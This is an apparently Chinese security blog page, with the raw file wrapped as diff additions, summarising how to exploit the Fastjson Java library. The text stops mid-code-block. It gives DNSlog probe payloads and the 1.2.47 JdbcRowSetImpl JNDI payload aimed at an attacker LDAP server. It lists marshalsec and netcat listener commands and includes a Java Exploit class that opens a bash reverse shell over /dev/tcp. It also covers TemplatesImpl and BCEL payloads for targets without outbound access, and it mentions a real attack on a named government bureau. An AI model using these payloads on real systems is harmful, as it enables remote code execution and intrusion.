@@ -1,0 +1,1671 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Fastjson利用总结 - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="Fastjson利用总结" />
+<meta property="og:description" content="0X01 漏洞利用 探测fastjson 对于有错误回显的情况
+使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
+无回显使用dnslog探测POC：
+ {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}} {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;} Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}] Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;} {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0  抓包修改请求体
+==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
+验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，
+无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
+{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
+ 在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/fastjson/" /><meta property="og:image" content="https://example.com/v1.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-01T21:11:59+08:00" />
+<meta property="article:modified_time" content="2022-02-18T21:11:59+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/v1.jpg"/>
+
+<meta name="twitter:title" content="Fastjson利用总结"/>
+<meta name="twitter:description" content="0X01 漏洞利用 探测fastjson 对于有错误回显的情况
+使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
+无回显使用dnslog探测POC：
+ {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}} {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;} {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;} Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}] Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;} {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0  抓包修改请求体
+==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
+验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，
+无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
+{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
+ 在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e."/>
+<meta name="application-name" content="柠檬k">
+<meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/fastjson/" /><link rel="next" href="https://example.com/config/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Fastjson利用总结",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/fastjson\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1921 ,
+        "url": "https:\/\/example.com\/fastjson\/","datePublished": "2022-02-01T21:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "nmk","logo": "https:\/\/example.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "nmk"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/cl/"> 文章收集 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Type to search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Type to search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/cl/" title="">文章收集</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Fastjson利用总结</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%85%B6%E4%BB%96/"><i class="far fa-folder fa-fw"></i>其他</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1921 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#探测fastjson">探测fastjson</a></li>
+    <li><a href="#验证是否存在漏洞">验证是否存在漏洞</a></li>
+    <li><a href="#绕过高版本jdk对jndi注入的限制">绕过高版本jdk对jndi注入的限制</a>
+      <ul>
+        <li><a href="#如何判断服务是否使用高版本jdk"><strong>如何判断服务是否使用高版本jdk</strong></a></li>
+        <li><a href="#绕过高版本jdk对jndi注入的限制-1"><strong>绕过高版本jdk对jndi注入的限制</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#fastjson不出网与命令回显">fastjson不出网与命令回显</a></li>
+    <li><a href="#绕waf">绕waf</a></li>
+    <li><a href="#fastjson1268利用">fastjson1.2.68利用</a>
+      <ul>
+        <li><a href="#任意文件写入">任意文件写入</a></li>
+        <li><a href="#mysql-rce">Mysql RCE</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#基于templateimpl的利用链">基于TemplateImpl的利用链</a>
+      <ul>
+        <li><a href="#依赖">依赖</a></li>
+        <li><a href="#poc">POC</a></li>
+        <li><a href="#分析">分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#基于jdbcrowsetimpl的利用链">基于JdbcRowSetImpl的利用链</a>
+      <ul>
+        <li><a href="#依赖-1">依赖</a></li>
+        <li><a href="#poc-1">POC</a></li>
+        <li><a href="#分析-1">分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#基于basicdatasource的利用链">基于BasicDataSource的利用链</a>
+      <ul>
+        <li><a href="#依赖-2">依赖</a></li>
+        <li><a href="#poc-2">POC：</a></li>
+        <li><a href="#分析-2">分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="0x01-漏洞利用">0X01 漏洞利用</h1>
+<h2 id="探测fastjson">探测fastjson</h2>
+<p><strong>对于有错误回显的情况</strong></p>
+<p>使用<code>{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code>或者 <code>&quot;{&quot;a&quot;:x&quot;</code>通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png"
+        data-srcset="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png, https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png 1.5x, https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png"
+        data-srcset="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png, https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png 1.5x, https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png"
+        title="image.png" /></p>
+<p><strong>无回显使用dnslog探测POC：</strong></p>
+<ol>
+<li><code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}}</code></li>
+<li><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
+<li><code>{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
+<li><code>{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;}</code></li>
+<li><code>Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}]</code></li>
+<li><code>Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}</code></li>
+<li><code>{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0</code></li>
+</ol>
+<p>抓包修改请求体</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png"
+        data-srcset="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png, https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png 1.5x, https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png"
+        title="image.png" /></p>
+<p>==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png"
+        data-srcset="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png, https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png 1.5x, https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png"
+        title="image.png" /></p>
+<h2 id="验证是否存在漏洞">验证是否存在漏洞</h2>
+<p>fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，</p>
+<p>无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下</p>
+<p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code></p>
+<ol>
+<li>在我们的云服务器上开启LDAP服务：<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit</code></li>
+<li>同目录开启http服务：<code>python3 -m http.server 80</code></li>
+<li>NC监听：<code>nc -lvvp 8888</code></li>
+<li>javac编译下面恶意类，将编译好的<code>Exploit.class</code>文件放在http同目录下</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">Exploit</span><span class="o">(){</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">argv</span><span class="o">){</span>
+        <span class="n">Exploit</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>发送payload，getshell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png"
+        data-srcset="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png, https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png 1.5x, https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png"
+        title="image.png" /></p>
+<p><strong>实战基本是直接拿47版本的payload打dnslog，dnslog有反应就继续，没反应再一步一步验证。 🙃效率高很多。</strong></p>
+<h2 id="绕过高版本jdk对jndi注入的限制">绕过高版本jdk对jndi注入的限制</h2>
+<blockquote>
+<p>高版本jdk默认禁止jndi注入。</p>
+</blockquote>
+<blockquote>
+<p>所以基于jndi+RMI的利用需要JDK版本&lt;=6u141、7u131、8u121，</p>
+</blockquote>
+<blockquote>
+<p>基于jndi+LDAP利用的JDK版本&lt;=6u211、7u201、8u191、11.0.1</p>
+</blockquote>
+<h3 id="如何判断服务是否使用高版本jdk"><strong>如何判断服务是否使用高版本jdk</strong></h3>
+<p>低版本jdk的jndi注入（<code>jdk1.8.45</code>）：</p>
+<p>ldap收到请求重定向到<a href="http://47.119.161.84:888/Exploit.class" target="_blank" rel="noopener noreffer">http://47.119.161.84:888/Exploit.class</a>。 再发起http请求加载Exploit.class(弹计算器)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png"
+        data-srcset="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png, https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png 1.5x, https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png"
+        title="image.png" /></p>
+<p>高版本jdk的jndi注入（jdk1.8.212）：</p>
+<p>ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png"
+        data-srcset="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png, https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png 1.5x, https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png"
+        title="image.png" /></p>
+<p>所以实战情况下遇到上述情况（<strong>ldap服务收到信息，却没有http请求</strong>）多半可以断定是采用高版本jdk。</p>
+<h3 id="绕过高版本jdk对jndi注入的限制-1"><strong>绕过高版本jdk对jndi注入的限制</strong></h3>
+<p>绕过原理参考：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener noreffer">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
+<p><a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener noreffer">https://www.mi1k7ea.com/2020/09/07/浅析高低版JDK下的JNDI注入及绕过</a></p>
+<p><strong>依赖受害者本地CLASSPATH中环境，利用受害者本地的Gadget进行攻击。</strong></p>
+<p><code>javax.el.ELProcessor</code>依赖于<code>tomcat8</code></p>
+<p><code>com.ibm.ws.webservices.engine.client.ServiceFactory</code>依赖于<code>IBM WebSphere</code></p>
+<p><code>com.ibm.ws.client.applicationclient.ClientJ2CCFFactory</code>依赖于<code>IBM WebSphere</code></p>
+<p>GitHub上的轮子：<a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreffer">https://github.com/veracode-research/rogue-jndi</a></p>
+<p>以实战为例：深圳地质局的fastjson</p>
+<p>：<strong>见视频</strong> 😇</p>
+<p>视频有些敏感，不公开了。</p>
+<h2 id="fastjson不出网与命令回显">fastjson不出网与命令回显</h2>
+<blockquote>
+<p>注：此攻击手法同样适用于高版本jdk下的利用</p>
+</blockquote>
+<p>1.2.24版本的三个POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="mi">1</span><span class="err">.</span> <span class="err">基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>
+<span class="p">{</span>
+		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
+		<span class="nt">&#34;_bytecodes&#34;</span><span class="p">:[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
+		<span class="err">&#39;_name&#39;:&#39;a.b&#39;,</span>
+		<span class="err">&#39;_tfactory&#39;:{</span> <span class="p">}</span><span class="err">,</span>
+		<span class="s2">&#34;_outputProperties&#34;</span><span class="err">:</span><span class="p">{}</span><span class="err">,</span>
+		<span class="s2">&#34;_name&#34;</span><span class="err">:</span><span class="s2">&#34;a&#34;</span><span class="err">,</span>
+		<span class="s2">&#34;_version&#34;</span><span class="err">:</span><span class="s2">&#34;1.0&#34;</span><span class="err">,</span>
+		<span class="s2">&#34;allowedProtocols&#34;</span><span class="err">:</span><span class="s2">&#34;all&#34;</span>
+<span class="err">}</span>
+<span class="mi">2</span><span class="err">.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）</span>
+
+<span class="p">{</span>
+		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> 
+		<span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="p">,</span> 
+		<span class="nt">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span>
+<span class="p">}</span>
+
+<span class="mi">3</span><span class="err">.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource</span>
+<span class="p">{</span>
+    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;driverClassLoader&#34;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span>
+    <span class="p">},</span>
+    <span class="nt">&#34;driverClassName&#34;</span><span class="p">:</span> <span class="s2">&#34;$$BCEL$$$l$8b......&#34;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中基于其中1、3利用链都是基于java字节码，不需要出网。使用47版本的绕过方式（<code>java.lang.Class</code>）改造1、3两个poc，使他们适用于47以下的版本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
